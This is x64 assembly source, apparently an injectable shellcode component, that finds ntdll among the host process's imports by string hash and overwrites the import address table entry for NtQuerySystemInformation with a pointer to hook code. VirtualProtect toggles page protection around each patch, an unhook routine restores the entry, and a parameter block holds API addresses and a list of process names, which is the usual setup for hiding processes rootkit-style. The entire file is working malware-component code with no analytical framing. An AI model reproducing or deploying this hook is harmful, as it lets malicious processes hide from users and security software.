[bits 64]
    push r15                ; store r15
    sub rsp, 8              ; 16 byte stack align
    call reloc_base         ; get reloc_base on the stack
reloc_base:
    pop r15                 ; reloc base in r15
    sub r15, 11             ; offset of the size of the opcode of the instr above
 
jmp main

; arg0: str             rcx
;
; ret: num chars        rax
utils_strlen:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                 ; str

    ; rbp - 8 = output strlen
    ; rbp - 16 = rsi
    sub rsp, 16                         ; allocate local variable space
    
    mov qword [rbp - 8], 0              ; strlen = 0
    mov [rbp - 16], rsi                 ; save rsi

    mov rsi, [rbp + 16]                 ; str

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]            ; ++strlen

        .while_condition:
            lodsb                       ; load from mem to al

            cmp al, 0                   ; end of string ?
            jne .loop
    
    mov rsi, [rbp - 16]                 ; restore rsi 
    mov rax, [rbp - 8]                  ; strlen in rax

    leave
    ret

; arg0: &str                rcx
;
; ret: folded hash value    rax
utils_str_hash:
        push rbp 
        mov rbp, rsp

        mov [rbp + 16], rcx     ; &str

        ; rbp - 8 = return value (hash)
        ; rbp - 16 = rbx

        ; r10 = i
        ; r11 = strlen
        ; r8 = tmp word value from str
        ; rbx = &str
        ; rcx = offset from rbx
        ; rax = currentfold

        sub rsp, 16             ; local variable space
        sub rsp, 32             ; shadow space

        mov qword [rbp - 8], 0  ; hash
        mov [rbp - 16], rbx     ; store rbx

        mov rbx, [rbp + 16]     ; &str
        xor r10d, r10d          ; i

        mov rcx, [rbp + 16]     ; &str
        call utils_strlen

        mov r11, rax

    .loop:
        xor rax, rax
        mov al, [rbx + r10]     ; str[i] in ax, currentfold
        shl rax, 8              ; <<= 8

    .i_plus_1: 
        mov rcx, r10            ; i
        add rcx, 1              ; i + 1

        cmp rcx, r11            ; i + 1 < strlen
        jge .i_plus_2

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 1]
        shl rax, 8              ; <<= 8

    .i_plus_2:
        mov rcx, r10            ; i
        add rcx, 2              ; i + 2

        cmp rcx, r11            ; i + 2 < strlen
        jge .i_plus_3

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 2]
        shl rax, 8              ; <<= 8

    .i_plus_3:
        mov rcx, r10            ; i
        add rcx, 3              ; i + 3

        cmp rcx, r11            ; i + 3 < strlen
        jge .cmp_end

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 3]
        
    .cmp_end:
        add [rbp - 8], rax      ; hash += currentFold

        add r10, 4              ; i += 4

        cmp r10, r11            ; i < strlen
        jl .loop

    .shutdown:
        mov rbx, [rbp - 16]     ; restore rbx
        mov rax, [rbp - 8]      ; return value

        leave
        ret

hook:
        push rbp
        mov rbp, rsp

        ; rbp - 8 = return value
        ; rbp - 16 = current module hnd
        ; rbp - 24 = import descriptor size
        ; rbp - 32 = current image import descriptor
        ; rbp - 40 = r12
        ; rbp - 48 = oldProtect
        ; rbp - 56 = padding bytes
        ; rbp - 64 = padding bytes
        sub rsp, 64                 ; local variable space
        sub rsp, 32                 ; shadow variable space

        mov qword [rbp - 8], 0      ; return value
        mov [rbp- 40], r12          ; store r12

        ; get current module handle
        xor rcx, rcx
        call [r15 + params + 192]   ; getModuleHandleA

        cmp rax, 0
        je .shutdown

        mov [rbp - 16], rax         ; current module hnd

        ; load dbghelp 
        mov rcx, r15
        add rcx, dbghelpStr
        call [r15 + params + 200]   ; LoadLibraryA

        ; get first imageImportDescriptor
        mov rcx, [rbp - 16]         ; current module hnd
        mov rdx, 1                  ; TRUE
        mov r8, 1                   ; IMAGE_DIRECTORY_ENTRY_IMPORT
        mov r9, rbp
        sub r9, 24                  ; import descriptor size
        mov qword [rsp + 32], 0
        call [r15 + params + 208]   ; ImageDirectoryEntryToDataEx

        cmp rax, 0
        je .shutdown

        mov [rbp - 32], rax         ; image import descriptor

        ; loop through image import descriptor
        xor r12, r12                ; current module count
    
    .module_loop:
        mov rax, [rbp - 32]         ; current image import descriptor
        add rax, 12                 ; IMAGE_IMPORT_DESCRIPTOR.Name (RVA)
        mov eax, [rax]

        add rax, [rbp - 16]         ; current module hnd, rax pointing to name string

        ; calculate hash of name string
        mov rcx, rax
        call utils_str_hash

        cmp rax, [r15 + ntdllHash]
        je .module_found

        add qword [rbp - 32], 20    ; add sizeof IMAGE_IMPORT_DESCRIPTOR

        add r12, 20
        cmp r12, [rbp - 24]         ; import descriptor size

        jne .module_loop
        jmp .shutdown

    .module_found:
        mov rax, [rbp - 32]         ; current image import descriptor
        add rax, 16                 ; offset to first thunk
        mov eax, [rax]
        add rax, [rbp - 16]         ; add current module hnd, rax is IMAGE_THUNK_DATA
        
    .function_loop:
        mov rcx, [r15 + params + 176]   ; ntQuerySystemInformation
        cmp [rax], rcx
        je .function_found

        add rax, 8                  ; add size of thunk data next thunk data
        
        cmp rax, 0
        jne .function_loop

        jmp .shutdown

    .function_found:
        mov [r15 + params + 232], rax   ; func addr page

        ; change protection to RW
        mov rcx, [r15 + params + 232]   ; func addr page
        mov rdx, 4096
        mov r8, 0x4                 ; PAGE_READWRITE
        mov r9, rbp
        sub r9, 48                  ; oldProtect
        call [r15 + params + 184]   ; VirtualProtect

        cmp rax, 0
        je .shutdown

        mov rax, [r15 + params + 232]   ; func addr page
        mov rcx, [r15 + params + 224]   ; hooked mem
        mov qword [rax], rcx

        ; change protection to oldProtect
        mov rcx, [r15 + params + 232]   ; func addr page
        mov rdx, 4096
        mov r8, [rbp - 48]          ; oldProtect
        mov r9, rbp
        sub r9, 48                  ; oldProtect
        call [r15 + params + 184]   ; VirtualProtect

    .shutdown:

        mov rax, [rbp - 8]          ; return value
        mov r12, [rbp - 40]         ; restore r12

        leave
        ret

unhook:
        push rbp
        mov rbp, rsp

        ; rbp - 8 = return value
        ; rbp - 16 = oldProtect
        ; rbp - 32 = padding bytes

        sub rsp, 32                 ; local variable space
        sub rsp, 32                 ; shadow space

        ; change protect to RW
        mov rcx, [r15 + params + 232]   ; func addr page
        mov rdx, 4096
        mov r8, 0x4                     ; PAGE_READWRITE
        mov r9, rbp
        sub r9, 16                      ; &oldProtect
        call [r15 + params + 184]       ; virtualProtect

        cmp rax, 0
        je .shutdown

        ; restore ntquerysysteminformation func addr
        mov rax, [r15 + params + 232]       ; func addr page
        mov rcx, [r15 + params + 176]       ; ntQuerySystemInformation
        mov [rax], rcx

        ; change protect to oldProtect
        mov rcx, [r15 + params + 232]   ; func addr page
        mov rdx, 4096
        mov r8, [rbp - 16]              ; oldProtect
        mov r9, rbp
        sub r9, 16                      ; &oldProtect
        call [r15 + params + 184]       ; virtualProtect

        cmp rax, 0
        je .shutdown

    .shutdown:
        leave
        ret

main:
        push rbp
        mov rbp, rsp

        ; rbp - 8 = return value
        ; rbp - 16 = kernel hnd
        ; rbp - 24 = GetProcAddress addr
        ; rbp - 32 = padding bytes
        sub rsp, 32                         ; local variable space
        sub rsp, 32                         ; shadow space

        ; parse params
        movzx eax, byte [r15 + params]      ; action
    .hook:
        cmp al, 0                           ; hook ?
        jne .unhook

        call hook
        jmp .continue

    .unhook:
        cmp al, 1                           ; unhook ?
        jne .continue

        call unhook
        jmp .continue

    .continue:
        
    .shutdown:
        
        leave
        add rsp, 8
        pop r15                             ; restore r15
        ret

hookStr: db 'Hook', 0
unhookStr: db 'Unhook', 0

ntdllHash: dq 0xdaa334d8
dbghelpStr: db 'dbghelp', 0
.len equ $ - dbghelpStr - 1

align 16
params:
; action:                       0
; procNameCount:                8
; procNames: 8 * 20             16
; ntquerysysteminformation      176
; virtualProtect                184
; getModuleHandleA              192
; loadLibraryA                  200
; imageDirectoryEntryToDataEx   208
; outputDebugStringA            216
; hooked mem                    224
; func addr page                232